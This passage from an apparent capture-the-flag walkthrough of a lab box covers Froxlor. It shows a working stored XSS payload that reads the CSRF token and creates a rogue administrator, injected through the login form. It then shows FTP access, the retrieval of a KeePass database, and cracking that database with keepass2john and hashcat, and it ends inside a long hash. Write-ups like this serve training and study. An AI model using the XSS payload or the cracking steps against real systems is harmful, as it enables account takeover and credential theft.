  xhr.open("POST",url,true);
  xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
  alert("Your Froxlor Application has been completely Hacked");
  xhr.send(params)};a=b()`()
}}

```

It’s basically just making a POST request to `/admin_admins.php` to create a new admin, and then posting a message box saying that the application has been hacked. The URL is for `demo.froxlor.org`, which also needs to be updated.

The challenge with this payload is that I have no idea when the XSS has fired. And presumable the box has a cron deleting that admin account (so players can’t get by on other’s exploit), so there will be a tight window when my new creds work. I’ll update the URL and the username to something of mine:

```

admin{{$emit.constructor`
  function b(){
    var metaTag=document.querySelector(\'meta[name="csrf-token"]\');
    var csrfToken=metaTag.getAttribute(\'content\');
    var xhr=new XMLHttpRequest();
    var url="http://admin.sightless.htb:8080/admin_admins.php";
    var params="new_loginname=admin0xdf&admin_password=Abcd@@1234&admin_password_suggestion=mgphdKecOu&def_language=en&api_allowed=0&api_allowed=1&name=Abvcd&email=adminadmin@gmail.com&custom_notes=&custom_notes_show=0&ipaddress=-1&change_serversettings=0&change_serversettings=1&customers=0&customers_ul=1&customers_see_all=0&customers_see_all=1&domains=0&domains_ul=1&caneditphpsettings=0&caneditphpsettings=1&diskspace=0&diskspace_ul=1&traffic=0&traffic_ul=1&subdomains=0&subdomains_ul=1&emails=0&emails_ul=1&email_accounts=0&email_accounts_ul=1&email_forwarders=0&email_forwarders_ul=1&ftps=0&ftps_ul=1&mysqls=0&mysqls_ul=1&csrf_token="+csrfToken+"&page=admins&action=add&send=send";
    xhr.open("POST",url,true);
    xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xhr.send(params)};a=b()`()
  }
}

```

I’ll remove the `alert` line, and update the username and password to something I like (0xdf / 0xdf0xdf!).

To execute this exploit, I’ll put Burp Proxy in Intercept mode, and then login with bad creds:

![image-20240909181347605](/img/image-20240909181347605.png)

At Burp, I’ll paste the payload as the `loginname`:

![image-20240909190207566](/img/image-20240909190207566.png)

Pretty quickly after sending, I’m able to login with the new account.

### FTP Access

There is at least one unintended way to abuse Froxlor to go directly to RCE. I’ll show that in [Beyond Root](#php-fpm-rce).

#### Admin Enumerate Froxlor

On logging in, there’s a dashboard:

![image-20240909210936134](/img/image-20240909210936134.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

Under Resources –> Admins, it shows the expected admin as well as my added admin:

![image-20240909212215198](/img/image-20240909212215198.png)

Under Resources –> Customers, there’s a single user:

![image-20240909212306859](/img/image-20240909212306859.png)

Clicking the Edit icon loads a form with a bunch of options for this user:

![image-20240909212407029](/img/image-20240909212407029.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

There’s an option to change the password, which I’ll do. There’s a complexity requirement, so I’ll use “0xdf0xdfQ!”.

This password doesn’t work for any user over SSH or `su` or FTP.

#### Customer Enumerate Froxlor

The new password does log into Froxlor as web1:

![image-20240909215657440](/img/image-20240909215657440.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

Under “FTP Accounts”, there’s one for web1:

![image-20240909215723711](/img/image-20240909215723711.png)

I’ll edit this user and set their password.

#### FTP

I’ll connect to FTP and login using `lftp` as mentioned [above](#ftp---tcp-21):

```

oxdf@hacky$ lftp sightless.htb 
lftp sightless.htb:~> login web1 0xdf0xdfQ!
lftp web1@sightless.htb:~> 

```

`ls` fails here:

```

lftp web1@sightless.htb:~> ls
ls: Fatal error: Certificate verification: The certificate is NOT trusted. The certificate issuer is unknown.  (A1:4B:95:93:0A:CF:15:CD:DD:52:68:ED:DB:5B:92:ED:F0:F3:3C:69)

```

That’s because it’s over TLS, and the certificate isn’t signed by a trusted CA. I’ll tell `ltfp` to ignore that:

```

lftp web1@sightless.htb:~> set ssl:verify-certificate no
lftp web1@sightless.htb:~> ls
drwxr-xr-x   3 web1     web1         4096 May 17 03:17 goaccess
-rw-r--r--   1 web1     web1         8376 Mar 29 10:29 index.html

```

There’s two files, an HTML page and a KeePass DB:

```

lftp web1@sightless.htb:/> get index.html
8376 bytes transferred                       
lftp web1@sightless.htb:/> ls goaccess/
drwxr-xr-x   2 web1     web1         4096 Aug  2 07:14 backup
lftp web1@sightless.htb:/> ls goaccess/backup/
-rw-r--r--   1 web1     web1         5292 Aug  6 14:29 Database.kdb
lftp web1@sightless.htb:/> get goaccess/backup/Database.kdb 
5292 bytes transferred 

```

### KeePass DB

#### Password Required

KeePass is an opensource password manager. I like `kpcli` for accessing it (`apt install kpcli`):

```

oxdf@hacky$ kpcli --kdb Database.kdb
Provide the master password:

```

It requires a password to access.

#### Crack

I’ll use `keepass2john` (from [john](https://github.com/openwall/john)) to generate a hash for the password on the DB:

```

oxdf@hacky$ keepass2john Database.kdb | tee Database.kdb.hash
Inlining Database.kdb
Database.kdb:$keepass$*1*600000*0*6a92df8eddaee09f5738d10aadeec391*29b2b65a0a6186a62814d75c0f9531698bb5b42312e9cf837e3ceeade7b89e85*f546cac81b88893d598079d95def2be5*9083771b911d42b1b9192265d07285e590f3c2f224c9aa792fc57967d04e2a70*1*5168*14bee18518f4491ef53856b181413055e4d26286ba94ef50ad18a46b99571dea3bfab3faba16550a7e2191179a16a0e38b806bb128c78d98ae0a50a7fafea327a2a247f22f2d8c78dfae6400c9e29e25204d65f9482608cfc4e48a8f5edfd96419ac45345c73aa7fb3229de849396b393a71a85e91cf5ac459f3e447ee894f8f3cf2d982dfb023183c852805fbcc9959d4e628ab3655d2df1feb4ceff80f0782b28ff893e7dfd3b5fa42e2c4dad79544e55931e62b1b6ec678b800db1ddf3f9176f6eab55724c38f49642608df2fdf300ff13d2e6391c45e321ef5b8223d722585f3bb1dcce3b560c4e8a73a51e57a8a151f426219ecd692111f902756a2295045f0425f998dba7ea54cdf615f55ee1065daec8345ca17a4c1c73bd60efebf7e8aab724bb897686145ea0eaf02495702da93365627f8cad3595beb88ca1de110235262133c1f2e24fca87eb98484d078bcf5c8a9d82df21266c39945c4876f840e1d20005898c70c22d5446f51c4786eb4af5c794ba0997cbdd77f1bc26d298e84b2509adb949221bf18cafaae6872f39f653310fa5b5d952b93be743fe14b2b99d9cbaf565e222105fb30b23f7cf447cdb3c14856a45bd7a0095afa5f8305430bed5f3b407f05f7def2fa219dc0623749d44230afbf2be2271c8f7cd5a5aa6b71d08625398c45e5ef9019ebd7a34245db3376d13c6f6bbcb6e567bf0eb8aa4ff2be7aa7d1b531e2673a66b605b0eba41da786c659f21db45092fe9b0fae8516f59ebc5db14f289076e1e4d65f83426f2b9c4b54e35891aea08d5c01058ac76533af054a7668d6a278f348f7dc12f89c00c05a64a8bea9e97831bed27fed42859bf0fcd10a3fde08e7da1a725d35c9f89e7a9a1b6ab86fe085684b6ef5ffffb597226d31a72252e7912b8876e1e49e14e25eb4812d200badfb56a1da1b786562ef2a0922d2c9c387395379972b400da586a86f6e3487286c40ac94984db79193ddb3a7ced83c19b3f064a33cba3323c217d9255b0b25d4a0e2562100e74fdb38febeae38efeebee10bbbf890524bf180ba3f789a300adc31145544fa02660d3321823f8ac5986c3f08ddf8d90653390e1180839f51307d162735360cf71451dfa5e3933397ec86f64afad134b7197312fee886d8aa32b1db48fc7ef33d1dca70a1e65b60f77b7ffe5ec8b89cf14e5d3ea5868ebf835cd6568d1384a8b4d8d4c8085c52fa5bbb49c0dac23eafd0fb713931e4c91b2870797334e73b07a872050c9765ef63d16194ca48930efb975238aaa7dd28a6d8c9cc09e55f552a7d6fd0520c51df01bd3916c0fbcb92b4363b5062c0c961e2979b55bedf6a1cdb8cecafc64c3860344ccc034b474a0706e92d2ed9476cb56dc50ee59320e3439dd79b3047a8686a4984d70302042862732373fefa0bf770ac267e32eb496ba9c4b81ba513a28b2e437470783343062d24040f1659a960f5599f0221d54daecf26585ad7a0565d916f77c5e6ddb7dccdf710261b2a3d5a1f23276ebd749c572e78af2b77e6bd57562ca07fdb85863f4da7bb56ac31d85964747d78ffcf969c156351b0844b3757ed338f91e022cbb329cfb072f7c142928f70294c69b43b6912e24481820e42b43e6f75debe621dbaaa9b413e09ba9cb8bc14b4fc274e9de4d312a45751d600635baab3836972b72019812171d12fc7a00895e853d5f1038f61cf57b601392d39a30d7d6bfcabb026b7d240cdbe53a24c78f62a8db4c469edbae9e5009b35c8bbe70aaff474300e3b330e623134d782941b097eb9c305f45e6191c880a359aec7df8fe4ce4bc2420cdd37dff3cd35d75537990b1d0438122ecaff6e4c6876716b3a07ff76a4c1ffac66ad953529a278859c03d8328ce4098904444efb9dabd4ed2094254a5092b5568f138b54f6e00419a4e6d172a752ce1f1ee02441b14dc2b2749cdd88cc6fa8fcc3b5cbf25678bf45077a7db2a3526af2e34250388e597df1a1af35dfaf143d381a9a22ba39bb9dad4b1dc3f054476b748a180644c6bdcf866f6e9651c6683ab37102eea9360e564ea16f28f60c020929222f317529e08ab3bedaaf0187cc86ee273a82f8089da1a80bba90b740e14117b4d9cba4e7c644ed697082f9390eef840adf01a8a122bbbd7adc8f08192286df95b5020b2ec01990f1d5097dcbb1ded5c06f8b264c32c3ba7c435ccd1eea3b3dbfd302ebd0fcd1f81bcfec783aeccd6274b10d8d81fa1bcb4ca9e4cda772d273fc332de2aed2b4a9e92604e34cdcaa6a3bea9c4f577a586f4ea2e4853222eab1973565f0b090be44aa5f22986346b0cf2640defde3eb15c90ff1547aff41d1d0e7bda8a9920753a74c70f7379a0bc1b796c41dc0505bb418a73e1511da920adb50079b382e104e99a854c69de8166866d7dd0bfd5106168de4c723521f23468e823992bd12b50c48d6f3cb9a6f08ada2fafab64e0181f0ff8cdb87712df3648b712407642fda4fb62c35f75311f1d706e4f7ec0fd9c7ffe0cf385344728ae1387e2e1d6bc4233b077cb0a2ebc05e28605a0ea523b13362292b8b79fe1a60af52cdd1a9d98bd331017938db542f7c549887fd55f6b4fc0443f7a559e0dc423cddecd5bdf6669010c5400a615d512ae54c4e96f6cab884100866b82a207d0388d60696b643b3a5b9980d4779e2087bf128c959d8fa17ff03ad9bb2357ad9e6731181d5a281b8ce8d9823c987722d448fc284fb2a76db6b7f3b34662beca0c821539010dde477af6805c299c14fd26882427a6ae1c593ccc5a0b64e86e25048eda1c483c5e98141424cb4f4a89aacc9a3a46ceece670376e047b5c2cba218a5d79089051c2dd65f8108aa106610deaacad4d48a3d8f4e0307ce43a8a1e2ae9ec2a081792731ca04a0a76a499d8b8cbe3b8919b211e889223fdcc14dc3f3bd8df46544f3f3ae55327678cfc398ab9ed6795f3f8431121a9315128db96170793e7598523de18f5ac9befbc1406f8d202b7fc84d7267996708c374e664fdffc2723a5edadc7166497afbf8342457a9b5d5f462be2fe4874ec118bf0b2046fa01bd8cbe84d2d1a9e87edf4ddc39a7d652abe53e21f96acf978a3101aa295007df1f97aca99e6a928d64b2ef2178c49a33a78d9854b821420cc4f86f88d8a5229940627c2c10bf5dfa57319516982c1e9d3efb2000f69b8070e001cf1b4b67c4d0b62cfb8abee7289d762f923ef1cd353513e594266f5d8033e7b54abcde6cc0331235a9dd4d02205e2368617ae91cb344c8b23ea48238539c714797314dc553976f0981f0d170107509721b1b08228a4e4f283f5b807b93683529580b2606ab9ff0d2b24e7b5142fb3421853cccf9f177ecbd28f3d42301780dc85d93d5786792d57854bd622e4711894a2a28572ff5e8a8c716ae3469b800756675adf9eb36f851c9ca7fb6ab7132dcb2a70843810ec316d9e04c2474e261f17ec2db75c0360f851dde9220f06f6e07943a94b7cc480a6044a4674358588957f007a16e4c38b52ffdb8be19bdfcda1a08a0ebf73e3cd273afca96885ebc6066abe70b1ffe4f6fe883ad9250b5d64d05861de50155a363732569f3f05a09f83cad93b1de678ef2d8977ec18be486eb221c688137054ca61bed701cd33727401e3fa2965c54038674eca5be241bfdbd307e94e69d8a4528fb84550927341848ef545c1e61c1f4d6face96c5d10551923ae3f524e848f03e833dcbe23f15f7f36f69fb74a250182a95f58bb09b81f970e6b1ae80c872e689d4abd83b9c70ebc30eba421e8f0df7336307363e91b8a87026b58241b988617b8ef6152124427d15719945def6a47280de8b53e65d8536a456be8c51cc8fc464d65cdb7273f3061e00b69012320772ec4829fd017f64a7f3d033166e4f50ad8c7f648541df841e8f4029ae6f6b1ddf177ece8e6d59b155ee6af07fe7ad6080b74e0b47d81e52aae59c833dcdb3a9381bc841556575aa1c7a31d0c483df884ae37374819ded2b515d23d88f6e7f88f3042c688531ed24a4cdc86cb828d8466385d93fd99bdbc87b669a48cf152a0a18bf8d8fcb8ec880ccf2b7f13ea6756ddd25f0c1e01a502fd3bf30051a0ed7703ecf1359a620e809043f7d12001a8af9c396564a896ca7f6c2a79b6396ff824097e4a70cad24d0bb65d662ce7f4262da0ff1478ad48794e3ab822ff690828dc6d1670b604771c35c0387fbf8831f15f769d4fb5867600e408e1d20c2b2e18cabc0cf503fa9450932e34614515118a3487fcb13409bacb71e14efc037f6155a8c424eb426ad37f2a4c1a85e7cc4bd3dfe6d3d59e3de33ad77fa51b06c16cd2bd31ed7595283d94aa451a43090c275e0b11af6ca389650ad6791a5677128396940c6fe6f488d58fe5c007aca5b3c35a0e1ba086831125aeb809e43013eadc96e821830c88c997aedffc2499c31723565f33b68997a8706c65ae5988dc52c86c510bc9598659a8296ca9b2edef63593b099b9b51851ca8a62a29c64ff33f98a3462ab5357123feef533175290714c2bb2130450c90ac4aca14e575c3085be61fe8c8e64d34f880301bc499827ff869b579e82892c9084027095980a86d21c6025e94fba1ee539ca6d83c3eccdcf679d1aef855fca436e2975665302991c63eb7e8b4cc7ef97d8a9417aeccbcd84bbdd5951acedb555150f49ba460cf12b4b840b06a57064da3eaa5cb851aa5a0a42d4f4f061596d2a049f0d6ee02047358cd723edcca927469944de2c5ca5883e21f5ddf5f0042abfd2405384b9287bdefd05fcd4af0a16374a0edf2fb329717e5c1cba9bc71ba335ef70f3d8d668e05c41730b17b10a5af1c27e1d18f5848295483962333a629b58055177a0e1133d422a141ae32f6425b0cc93fb6ba3447625e4db1083f8381c87e9a13f9ac23cb0310bd31845b7a5fa8d9733173921ba0a24b2d402ab68551f49aebecf1a494780a39990ba2a479bff64e14fea5788e8bd93e34fd2aba22ec3e9bd0202e9b7641b974ea2994d8e497ff4da5e18d859adfbdd728a4b1611f8c647bdc13b2b7b4d71f9d29cd66a0ce66baf94be3ce84d71decbe8dc9b9db56650f4db5b4791637ca6a7fe3dd3e7185dbe304b855daf4326c99d9cef46522d54984347a2811bffd6072256243083542241d41ce966b745bbb1c426fe25e6b72be0cab78619e6697010fd3315cea2510ae8cc2f1a257f38e4f99b3baeb1fd16ddbe2e2c46e9e64a96c8c1b2c0bbe9bf25b10d855e08ad2f7e7e5975947e3de20412e50a8aca50db01ca21c7d9e0690615f622c4ac0465e6d419e0bb37d9a18384ddee4acfa8ed4395150625aa6af8851e7164c0e79365feac252e3774cf280224e13d5aa8504ac99da118de8c9992d51214d4fee550971fa80955ca0e1a3b9dc40a8869a9af467f5f94836e6f47937dafdebe0ea81c4098131c3e181ac41ac52fd9b751186042f4574ffeafe335f777ff01e715569cb5167c04cae21cfc9a9882612bcf29a15bbec4b0270df53e5ab278b8dc5db52b8ede7eb32011abfa685ce2d85b413290071abd7937615ac82bf0b0d439013d4f76cc3375e4a7018bc66af59940d14905a39fc0a64fb87ecd96c2a23cb1fc93efbe90c15b79073c63f11ca3443a1f48c7273fd40d5c8de6bf73fe59ea566d61091cf37a72b9362dfc1d78e103d04cc9131d8e3c36aee0dd7d2b9ea47d1863c103f338713ea48dc38bcaf81895a4cf110523e365fc33cb273410c96dbbbae42607524fbd370a6dac7c6e6211cded5895c75e21b45e93b6f243208c377f7d8851e9321d1c27d4d3e29d1e917a9a1b4ba79e20af92fcf6ddb7d8290a3992bbb7277027ef0eb417a13248e72c1f9c00f5d2c148fe8cf2d7268165f365d67f2312651d4464e61f92fa6135f64ea5a45d0de2ceb763114d47c827b95857f33354ea18ff3d4b7fad2b4c89728db903f5e2ccb02020f55c066dd667dc742e44e58c4aba67366a18e3e79a1d809b988ab95a0befca673f8a74ac3010929df6ff9a7974deec2c84103c60051cdb11ddd1b40322b43c2b1e6a648ff1c0ee4799c7e3759d93e634c4b8b028bb9ba6f784e246886bd1a5d1b0468023b74c36cc59e261683c03f827ca348b0ef6a1d54413ce35b73f3aac781d2542407ca0d516ad56461767d99fd9d40974d1da9286d13aa95357bc49bda0436a3d4d6bab6f6c15bd9a5bee51951971a30fda2f006b7abd63fd17174df4f3deb39b43f227e69fae1cb9aa3c2e967939c54b60b9a3ced0355cc28d5c2ed9992e5f48b068eb68ea74893eb67eaeeae275cc33b9a20b3bc098030dd94fcdffe9ae741fc1d49ad5db5512d7fea80549409dc0d6e1de8d52f56e38208e7eaaccb1ce30fd3dee463e3066badefe85e475b3ac25a4fc9f453b0b586c691167671dd43fbddb8a85dc3a1bbdacb3abfbbd2dd6d5dd4f426fe7ef69e2fbb5b033bb6c106d7d82eeb1d22d0e33a5a105aa05853dbd85d21e13f50deaaf9c424071b4cbb7bf3063b7787c389dd22d5cdd4eb9cb6abb38d10d112bdf73aefd47d01b5c3c731ea67b0981f3fccf4f1d37e0308bb20d9267ffeb82cffb143ec561ccce1f508d2847da7e3a03f65339ee4b3fbb514e742a45f45979758fd49222f10ffe66c3b1a476b11195c89dc4489f6c767a0aa2d9e8e947b1b5b294f06ccadf61a8b0252e9c3d68e98dfcafe5d8deafecbf4e78757af065642bf5ada1366b9c9f2b8bbe5062a15f0a5f8d1b2873bdcac2c33f4944a755d364301783819c9e5fcf48b440002893c2394af4958c070b914df256b95fd4e4e8cecc7855bed28356bf5922967e0d892b0c49bdb15dee450ad3ac7310979f32ada1418832087ccd6f9deae1df79c2fd10804515b7ed2f9e3b9282f67c45a66abce990b6950d1ff09bf28be9eefa4a3a1a13bfe8594305502d16a8db77b1e64633af0b4f9717ca2959ffe4cc7883829c66043db21bb490279b3a285230df9bf2ff99e2b7a5e5e9d6e9530d8df761ca87ad555a86685737b4d08c42a4467b085eeed5f20aad6a7359b8f5a3bfe6e91130deabd8911597dd4519fd344efb87c3d9571c71891bb7df0e8deec31ae1d7531cc16d20a3b283504993bfda6fd300c26c63c22e577dad658318f581d08c9d798e0130b6e280a92d469a75491575d3e5aac0735eafbade90ad9ac1301f78e43d4d6af579d8bd7716f2a570ba5f818ee5de2e71629e3df44a66950d189d705ea8808df406ebc701c4e3d5892fa5ad1452cc12bf87d79b386a4c55d48bddb0c5db39617d216025c874c08952a97c01fadfe6d65c0a54b9ddaa2b53e928ea11f2831884

```

I’ll note it starts with filename then “:” before the hash. I’ll want to use the `--user` flag with `hashcat`. Running in autodetect mode finds two possible matches for hash format:

```

$ hashcat Database.kdb.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
The following 2 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
      ======+============================================================+======================================
  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager

Please specify the hash-mode with -m [hash-mode].
...[snip]...

```

I’ll give it the first one, and it cracks the password in less than a minute:

```

$ hashcat Database.kdb.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user -m 13400
hashcat (v6.2.6) starting
...[snip]...
$keepass$*1*600000*0*6a92df8eddaee09f5738d10aadeec391*29b2b65a0a6186a62814d75c0f9531698bb5b42312e9cf837e3ceeade7b89e85*f546cac81b88893d598079d95def2be5*9083771b911d42b1b9192265d07285e590f3c2f224c9aa792fc57967d04e2a70*1*5168*14bee18518f4491ef53856b181413055e4d26286ba94ef50ad18a46b99571dea3bfab3faba16550a7e2191179a16a0e38b806bb128c78d98ae0a50a7fafea327a2a247f22f2d8c78dfae6400c9e29e25204d65f9482608cfc4e48a8f5edfd96419ac45345c73aa7fb3229de849396b393a71a85e91cf5ac459f3e447ee894f8f3cf2d982dfb023183c852805fbcc9959d4e628ab3655d2df1feb4ceff80f0782b28ff893e7dfd3b5fa42e2c4dad79544e55931e62b1b6ec678b800db1ddf3f9176f6eab55724c38f49642608df2fdf300ff13d2e6391c45e321ef5b8223d722585f3bb1dcce3b560c4e8a73a51e57a8a151f426219ecd692111f902756a2295045f0425f998dba7ea54cdf615f55ee1065daec8345ca17a4c1c73bd60efebf7e8aab724bb897686145ea0eaf02495702da93365627f8cad3595beb88ca1de110235262133c1f2e24fca87eb98484d078bcf5c8a9d82df21266c39945c4876f840e1d20005898c70c22d5446f51c4786eb4af5c794ba0997cbdd77f1bc26d298e84b2509adb949221bf18cafaae6872f39f653310fa5b5d952b93be743fe14b2b99d9cbaf565e222105fb30b23f7cf447cdb3c14856a45bd7a0095afa5f8305430bed5f3b407f05f7def2fa219dc0623749d44230afbf2be2271c8f7cd5a5aa6b71d08625398c45e5ef9019ebd7a34245db3376d13c6f6bbcb6e567bf0eb8aa4ff2be7aa7d1b531e2673a66b605b0eba41da786c659f21db45092fe9b0fae8516f59ebc5db14f289076e1e4d65f83426f2b9c4b54e35891aea08d5c01058ac76533af054a7668d6a278f348f7dc12f89c00c05a64a8bea9e97831bed27fed42859bf0fcd10a3fde08e7da1a725d35c9f89e7a9a1b6ab86fe085684b6ef5ffffb597226d31a72252e7912b8876e1e49e14e25eb4812d200badfb56a1da1b786562ef2a0922d2c9c387395379972b400da586a86f6e3487286c40ac94984db79193ddb3a7ced83c19b3f064a33cba3323c217d9255b0b25d4a0e2562100e74fdb38febeae38efeebee10bbbf890524bf180ba3f789a300adc31145544fa02660d3321823f8ac5986c3f08ddf8d90653390e1180839f51307d162735360cf71451dfa5e3933397ec86f64afad134b7197312fee886d8aa32b1db48fc7ef33d1dca70a1e65b60f77b7ffe5ec8b89cf14e5d3ea5868ebf835cd6568d1384a8b4d8d4c8085c52fa5bbb49c0dac23eafd0fb713931e4c91b2870797334e73b07a872050c9765ef63d16194ca48930efb975238aaa7dd28a6d8c9cc09e55f552a7d6fd0520c51df01bd3916c0fbcb92b4363b5062c0c961e2979b55bedf6a1cdb8cecafc64c3860344ccc034b474a0706e92d2ed9476cb56dc50ee59320e3439dd79b3047a8686a4984d70302042862732373fefa0bf770ac267e32eb496ba9c4b81ba513a28b2e437470783343062d24040f1659a960f5599f0221d54daecf26585ad7a0565d916f77c5e6ddb7dccdf710261b2a3d5a1f23276ebd749c572e78af2b77e6bd57562ca07fdb85863f4da7bb56ac31d85964747d78ffcf969c156351b0844b3757ed338f91e022cbb329cfb072f7c142928f70294c69b43b6912e24481820e42b43e6f75debe621dbaaa9b413e09ba9cb8bc14b4fc274e9de4d312a45751d600635baab3836972b72019812171d12fc7a00895e853d5f1038f61cf57b601392d39a30d7d6bfcabb026b7d240cdbe53a24c78f62a8db4c469edbae9e5009b35c8bbe70aaff474300e3b330e623134d782941b097eb9c305f45e6191c880a359aec7df8fe4ce4bc2420cdd37dff3cd35d75537990b1d0438122ecaff6e4c6876716b3a07ff76a4c1ffac66ad953529a278859c03d8328ce4098904444efb9dabd4ed2094254a5092b5568f138b54f6e00419a4e6d172a752ce1f1ee02441b14dc2b2749cdd88cc6fa8fcc3b5cbf25678bf45077a7db2a3526af2e34250388e597df1a1af35dfaf143d381a9a22ba39bb9dad4b1dc3f054476b748a180644c6bdcf866f6e9651c6683ab37102eea9360e564ea16f28f60c020929222f317529e08ab3bedaaf0187cc86ee273a82f8089da1a80bba90b740e14117b4d9cba4e7c644ed697082f9390eef840adf01a8a122bbbd7adc8f08192286df95b5020b2ec01990f1d5097dcbb1ded5c06f8b264c32c3ba7c435ccd1eea3b3dbfd302ebd0fcd1f81bcfec783aeccd6274b10d8d81fa1bcb4ca9e4cda772d273fc332de2aed2b4a9e92604e34cdcaa6a3bea9c4f577a586f4ea2e4853222eab1973565f0b090be44aa5f22986346b0cf2640defde3eb15c90ff1547aff41d1d0e7bda8a9920753a74c70f7379a0bc1b796c41dc0505bb418a73e1511da920adb50079b382e104e99a854c69de8166866d7dd0bfd5106168de4c723521f23468e823992bd12b50c48d6f3cb9a6f08ada2fafab64e0181f0ff8cdb87712df3648b712407642fda4fb62c35f75311f1d706e4f7ec0fd9c7ffe0cf385344728ae1387e2e1d6bc4233b077cb0a2ebc05e28605a0ea523b13362292b8b79fe1a60af52cdd1a9d98bd331017938db542f7c549887fd55f6b4fc0443f7a559e0dc423cddecd5bdf6669010c5400a615d512ae54c4e96f6cab884100866b82a207d0388d60696b643b3a5b9980d4779e2087bf128c959d8fa17ff03ad9bb2357ad9e6731181d5a281b8ce8d9823c987722d448fc284fb2a76db6b7f3b34662beca0c821539010dde477af6805c299c14fd26882427a6ae1c593ccc5a0b64e86e25048eda1c483c5e98141424cb4f4a89aacc9a3a46ceece670376e047b5c2cba218a5d79089051c2dd65f8108aa106610deaacad4d48a3d8f4e0307ce43a8a1e2ae9ec2a081792731ca04a0a76a499d8b8cbe3b8919b211e889223fdcc14dc3f3bd8df46544f3f3ae55327678cfc398ab9ed6795f3f8431121a9315128db96170793e7598523de18f5ac9befbc1406f8d202b7fc84d7267996708c374e664fdffc2723a5edadc7166497afbf8342457a9b5d5f462be2fe4874ec118bf0b2046fa01bd8cbe84d2d1a9e87edf4ddc39a7d652abe53e21f96acf978a3101aa295007df1f97aca99e6a928d64b2ef2178c49a33a78d9854b821420cc4f86f88d8a5229940627c2c10bf5dfa57319516982c1e9d3efb2000f69b8070e001cf1b4b67c4d0b62cfb8abee7289d762f923ef1cd353513e594266f5d8033e7b54abcde6cc0331235a9dd4d02205e2368617ae91cb344c8b23ea48238539c714797314dc553976f0981f0d170107509721b1b08228a4e4f283f5b807b93683529580b2606ab9ff0d2b24e7b5142fb3421853cccf9f177ecbd28f3d42301780dc85d93d5786792d57854bd622e4711894a2a28572ff5e8a8c716ae3469b800756675adf9eb36f851c9ca7fb6ab7132dcb2a70843810ec316d9e04c2474e261f17ec2db75c0360f851dde9220f06f6e07943a94b7cc480a6044a4674358588957f007a16e4c38b52ffdb8be19bdfcda1a08a0ebf73e3cd273afca96885ebc6066abe70b1ffe4f6fe883ad9250b5d64d05861de50155a363732569f3f05a09f83cad93b1de678ef2d8977ec18be486eb221c688137054ca61bed701cd33727401e3fa2965c54038674eca5be241bfdbd307e94e69d8a4528fb84550927341848ef545c1e61c1f4d6face96c5d10551923ae3f524e848f03e833dcbe23f15f7f36f69fb74a250182a95f58bb09b81f970e6b1ae80c872e689d4abd83b9c70ebc30eba421e8f0df7336307363e91b8a87026b58241b988617b8ef6152124427d15719945def6a47280de8b53e65d8536a456be8c51cc8fc464d65cdb7273f3061e00b69012320772ec4829fd017f64a7f3d033166e4f50ad8c7f648541df841e8f4029ae6f6b1ddf177ece8e6d59b155ee6af07fe7ad6080b74e0b47d81e52aae59c833dcdb3a9381bc841556575aa1c7a31d0c483df884ae37374819ded2b515d23d88f6e7f88f3042c688531ed24a4cdc86cb828d8466385d93fd99bdbc87b669a48cf152a0a18bf8d8fcb8ec880ccf2b7f13ea6756ddd25f0c1e01a502fd3bf30051a0ed7703ecf1359a620e809043f7d12001a8af9c396564a896ca7f6c2a79b6396ff824097e4a70cad24d0bb65d662ce7f4262da0ff1478ad48794e3ab822ff690828dc6d1670b604771c35c0387fbf8831f15f769d4fb5867600e408e1d20c2b2e18cabc0cf503fa9450932e34614515118a3487fcb13409bacb71e14efc037f6155a8c424eb426ad37f2a4c1a85e7cc4bd3dfe6d3d59e3de33ad77fa51b06c16cd2bd31ed7595283d94aa451a43090c275e0b11af6ca389650ad6791a5677128396940c6fe6f488d58fe5c007aca5b3c35a0e1ba086831125aeb809e43013eadc96e821830c88c997aedffc2499c31723565f33b68997a8706c65ae5988dc52c86c510bc9598659a8296ca9b2edef63593b099b9b51851ca8a62a29c64ff33f98a3462ab5357123feef533175290714c2bb2130450c90ac4aca14e575c3085be61fe8c8e64d34f880301bc499827ff869b579e82892c9084027095980a86d21c6025e94fba1ee539ca6d83c3eccdcf679d1aef855fca436e2975665302991c63eb7e8b4cc7ef97d8a9417aeccbcd84bbdd5951acedb555150f49ba460cf12b4b840b06a57064da3eaa5cb851aa5a0a42d4f4f061596d2a049f0d6ee02047358cd723edcca927469944de2c5ca5883e21f5ddf5f0042abfd2405384b9287bdefd05fcd4af0a16374a0edf2fb329717e5c1cba9bc71ba335ef70f3d8d668e05c41730b17b10a5af1c27e1d18f5848295483962333a629b58055177a0e1133d422a141ae32f6425b0cc93fb6ba3447625e4db1083f8381c87e9a13f9ac23cb0310bd31845b7a5fa8d9733173921ba0a24b2d402ab68551f49aebecf1a494780a39990ba2a479bff64e14fea5788e8bd93e34fd2aba22ec3e9bd0202e9b7641b974ea2994d8e497ff4da5e18d859adfbdd728a4b1611f8c647bdc13b2b7b4d71f9d29cd66a0ce66baf94be3ce84d71decbe8dc9b9db56650f4db5b4791637ca6a7fe3dd3e7185dbe304b855daf4326c99d9cef46522d54984347a2811bffd6072256243083542241d41ce966b745bbb1c426fe25e6b72be0cab78619e6697010fd3315cea2510ae8cc2f1a257f38e4f99b3baeb1fd16ddbe2e2c46e9e64a96c8c1b2c0bbe9bf25b10d855e08ad2f7e7e5975947e3de20412e50a8aca50db01ca21c7d9e0690615f622c4ac0465e6d419e0bb37d9a18384ddee4acfa8ed4395150625aa6af8851e7164c0e79365feac252e3774cf280224e13d5aa8504ac99da118de8c9992d51214d4fee550971fa80955ca0e1a3b9dc40a8869a9af467f5f94836e6f47937dafdebe0ea81c4098131c3e181ac41ac52fd9b751186042f4574ffeafe335f777ff01e715569cb5167c04cae21cfc9a9882612bcf29a15bbec4b0270df53e5ab278b8dc5db52b8ede7eb32011abfa685ce2d85b413290071abd7937615ac82bf0b0d439013d4f76cc3375e4a7018bc66af59940d14905a39fc0a64fb87ecd96c2a23cb1fc93efbe90c15b79073c63f11ca3443a1f48c7273fd40d5c8de6bf73fe59ea566d61091cf37a72b9362df